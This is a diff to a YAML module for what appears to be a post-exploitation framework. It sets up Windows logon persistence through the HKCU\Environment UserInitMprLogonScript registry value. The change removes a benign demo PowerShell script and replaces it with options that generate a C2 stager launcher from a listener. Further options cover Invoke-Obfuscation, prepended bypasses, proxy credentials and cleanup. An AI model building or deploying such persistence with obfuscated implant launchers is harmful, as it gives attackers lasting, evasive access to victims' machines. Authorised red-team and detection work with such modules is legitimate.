@@ -6,10 +6,10 @@ authors:
 description: |
   Establishes persistence by setting the UserInitMprLogonScript
   registry value under HKCU\Environment. This value specifies a
-  script that Windows executes during user logon. The module can
-  create a batch script with custom content and register it, or
-  point to an existing script. This is a well-known persistence
-  mechanism that survives reboots.
+  script that Windows executes during user logon. The module
+  generates a launcher from the specified listener and writes it
+  as a batch script, then registers it via the registry key. This
+  is a well-known persistence mechanism that survives reboots.
 software: ''
 tactics: [TA0003]
 techniques: [T1037.001]
@@ -22,54 +22,69 @@ min_language_version: '2'
 comments:
   - https://github.com/redcanaryco/atomic-red-team
 options:
+  - name: Listener
+    description: Listener to use for the stager.
+    required: true
+    value: ''
+  - name: Language
+    description: Language of the stager to generate.
+    required: true
+    value: powershell
+    strict: true
+    suggested_values:
+      - powershell
+      - csharp
+      - ironpython
+      - go
   - name: ScriptPath
     description: Path where the logon script will be written.
-    required: false
+    required: true
     value: '$env:TEMP\logon_script.bat'
-  - name: ScriptContent
-    description: >-
-      Content of the logon script. Leave empty to just set the registry key pointing
-      to ScriptPath.
+  - name: Obfuscate
+    description: Obfuscate the launcher powershell code.
     required: false
-    value: 'echo Logon Script Executed >> %USERPROFILE%\desktop\logon_log.txt'
-  - name: OutputFunction
-    description: PowerShell output function to use.
-    required: false
-    value: 'Out-String'
+    value: 'False'
+    strict: true
     suggested_values:
-      - Out-String
-      - ConvertTo-Json
-script: |
-  function Set-LogonScript {
-      param(
-          [string]$ScriptPath,
-          [string]$ScriptContent
-      )
-
-      $scriptFile = $ExecutionContext.InvokeCommand.ExpandString($ScriptPath)
-
-      # Create the script file if content is provided
-      if ($ScriptContent) {
-          $ScriptContent | Out-File -FilePath $scriptFile -Encoding ASCII -Force
-          Write-Output "[+] Created logon script: $scriptFile"
-          Write-Output "[+] Content: $ScriptContent"
-      } elseif (-not (Test-Path $scriptFile)) {
-          Write-Output "[-] Script file does not exist and no content provided: $scriptFile"
-          return
-      }
-
-      # Set the registry value
-      REG.exe ADD "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "$scriptFile" /f 2>&1 | Out-Null
-      Write-Output "[+] Set UserInitMprLogonScript registry value."
-      Write-Output "[+] Script will execute on next user logon: $scriptFile"
-
-      # Verify
-      $regVal = (Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue).UserInitMprLogonScript
-      if ($regVal) {
-          Write-Output "[+] Verified: UserInitMprLogonScript = $regVal"
-      } else {
-          Write-Output "[-] Failed to verify registry value."
-      }
-  }
-script_end: Set-LogonScript -ScriptPath "{{ ScriptPath }}" -ScriptContent "{{ ScriptContent
-  }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
+      - True
+      - False
+    depends_on:
+      - name: Language
+        values: ['powershell']
+  - name: ObfuscateCommand
+    description: The Invoke-Obfuscation command to use.
+    required: false
+    value: Token\All\1
+    depends_on:
+      - name: Language
+        values: ['powershell']
+      - name: Obfuscate
+        values: ['True']
+  - name: Bypasses
+    description: Bypasses as a space separated list to be prepended to the launcher.
+    required: false
+    value: ''
+  - name: UserAgent
+    description: User-agent string to use for the staging request (default, none,
+      or other).
+    required: false
+    value: default
+  - name: Proxy
+    description: Proxy to use for request (default, none, or other).
+    required: false
+    value: default
+  - name: ProxyCreds
+    description: Proxy credentials ([domain\]username:password) to use for request
+      (default, none, or other).
+    required: false
+    value: default
+  - name: Cleanup
+    description: Remove the persistence mechanism and clean up artifacts.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+advanced:
+  custom_generate: true
